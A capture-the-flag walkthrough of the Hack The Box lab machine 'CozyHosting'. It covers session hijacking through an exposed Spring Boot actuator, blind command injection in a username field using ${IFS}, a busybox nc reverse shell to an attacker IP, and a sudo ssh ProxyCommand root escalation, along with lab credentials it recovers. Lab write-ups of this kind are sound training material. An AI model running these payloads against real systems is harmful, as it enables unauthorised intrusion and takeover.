---
title: CozyHosting
date: 2026-09-29
description: Medium Linux box grabbing kanderson's session from /actuator/sessions, blind username command injection with ${IFS} for an app shell, and abusing sudo'd ssh ProxyCommand for root.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Sep 29 04:41:24 2026 as: /usr/lib/nmap/nmap -Pn -p22,80 -sCV -oN scan_results.txt 10.129.11.58
Nmap scan report for cozyhosting.htb (10.129.11.58)
Host is up (0.59s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 29 04:42:09 2026 -- 1 IP address (1 host up) scanned in 45.80 seconds
```

- There's an **/admin** page
- Got a **500 status code** while discovering directories -> `/error`

- **Whitelabel Error Page** -> A **whitelabel error** page is a generic, unbranded error page displayed by a web application or framework (commonly in **Spring Boot**) when something goes wrong and no custom error handler is configured.

We get to know it's made by the **Spring Boot framework** — test it using a **springboot wordlist** to find related **endpoints**:

```wordlist
/usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```

Found an endpoint **/actuator** -> reveals an interesting subdirectory `/sessions`

- Gained the session of a user **kanderson** -> using cookie editor

# User

There are two input fields which execute an ssh command with a key:
- Hostname
- Username

---
**Background process** :
```sh
ssh -i id_rsa username@hostname
```
---

Hostname needs to be valid -> `127.0.0.1` can be used.

The **hostname** seems to be a **strict field**, can't be abused — so move to the **username field**:
- We can set up a server or try time delay commands like `sleep 5`, because output looks like **blind command injection**
- it also won't accept spacing between letters => solution: `${IFS}`

> **Note**: `${IFS}` is a bash variable that contains the Internal Field Separator (default: space, tab, newline) used to split words and fields in shell scripts.

```username-field
dante;curl${IFS}http://10.10.16.82:8000/y;
```
- We got a response on our python server

Shell time:

```username-field
dante;busybox${IFS}nc${IFS}10.10.16.82${IFS}9001${IFS}-e${IFS}/bin/bash;
```

Gained shell as user **app**

In the `/app` directory where we got our shell there's a `.jar` file which is the **web application**:

```sh
unzip cloudhosting-0.0.1.jar
```

```dir-tree
cloudhosting-0.0.1
├── BOOT-INF
│   ├── classes
│   │   ├── application.properties
│   │   ├── htb
│   │   │   └── cloudhosting
│   │   │       ├── compliance
│   │   │       │   └── ComplianceService.class
│   │   │       ├── CozyHostingApp.class
│   │   │       ├── database
│   │   │       │   ├── CozyUser.class
│   │   │       │   ├── CozyUserDetailsService.class
│   │   │       │   └── UserRepository.class
│   │   │       ├── exception
│   │   │       │   └── ExceptionHandler.class
│   │   │       ├── MvcConfig.class
│   │   │       ├── scheduled
│   │   │       │   └── FakeUser.class
│   │   │       └── secutiry
│   │   │           ├── LoginListener.class
│   │   │           └── SecurityConfig.class
│   │   ├── static
...<SNIP>...
```

**application.properties** -> **configuration settings** for a web application, typically stored in a configuration file that controls how the application behaves without changing code (**In Spring Boot**):

```application-properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Gained creds of the **postgres** **username** and **password**:

> `postgres - Vg&nvzAQ7XxR`

Verified that **postgresql** is running internally.

### PostgreSQL

```sh
psql -h 127.0.0.1 -U postgres -W
```

```postgresql
\l              -- to list the databases
\c cozyhosting  -- to select/change the database
\dt             -- to list the tables
\d users        -- to list column name from the tables
select * from users;
```

- Decrypt the password using hashcat

We know there's a user named josh — josh might be the one who created the service (admin):

> `josh - manchesterunited`

Gained shell as user **josh**

# Root 

```sh
sudo -l

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

> Reference : https://gtfobins.org/gtfobins/ssh/#shell

```sh
sudo ssh -o ProxyCommand=';/bin/bash 0<&2 1>&2' x
```

Gained `root`
